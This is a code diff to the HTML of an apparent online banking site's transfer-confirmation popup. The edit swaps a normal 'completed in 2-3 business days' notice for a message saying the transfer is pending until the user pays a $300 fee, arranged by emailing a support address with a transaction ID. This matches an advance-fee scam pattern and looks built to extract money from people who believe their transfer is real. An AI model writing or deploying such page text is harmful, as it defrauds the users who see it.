@@ -1179,10 +1179,14 @@ body {
     <div class="dash-sub" style="margin-bottom:24px;" id="transferSuccessSubtitle">Your transfer has been successfully initiated.</div>
     <div class="success-notice">
       <div class="notice-label">Important Notice</div>
-      <div class="notice-title" id="transferTimeNotice">Payment will be completed after 2-3 business days</div>
-      <div class="notice-text" id="transferTimeDetail">Your transfer is now pending. The payment will be completed and reviewed within 2-3 business days. You can track the status in your transaction history.</div>
-    </div>
-    <div class="transfer-details" id="transferSummaryDetails"></div>
+      <div class="notice-title" id="transferTimeNotice">Payment will be completed after Verification</div>
+      
+<div class="notice-text" id="transferTimeDetail">
+  Your transfer is now pending. You need to pay a fee of $300 for the transfer to be processed. 
+  Please send a message to 
+  <a href="mailto:support@saintustbanking.com">support@saintustbanking.com</a> 
+  with your transaction ID #Z3ERWTWW2 to complete the payment and process your transfer.
+</div>    <div class="transfer-details" id="transferSummaryDetails"></div>
     <div style="display:flex;gap:12px;flex-direction:column;">
       <button class="btn-submit" onclick="viewTransactionDetails()">View Transaction</button>
       <button class="btn-cancel" onclick="closeModal('transferSuccessModal')">Done</button>
